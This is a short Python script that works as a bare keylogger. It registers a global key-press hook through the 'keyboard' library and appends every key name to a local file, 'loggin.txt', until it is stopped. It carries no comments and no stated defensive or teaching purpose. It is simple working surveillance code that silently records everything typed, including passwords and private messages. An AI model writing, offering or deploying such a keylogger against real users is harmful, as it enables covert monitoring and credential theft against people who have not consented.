import keyboard


def get_key(event):
    with open('loggin.txt', 'a') as file:
        if event.name == 'space':
            file.write(' \n')
        else:
            file.write(f'{event.name}\n')


keyboard.on_press(get_key)

keyboard.wait()
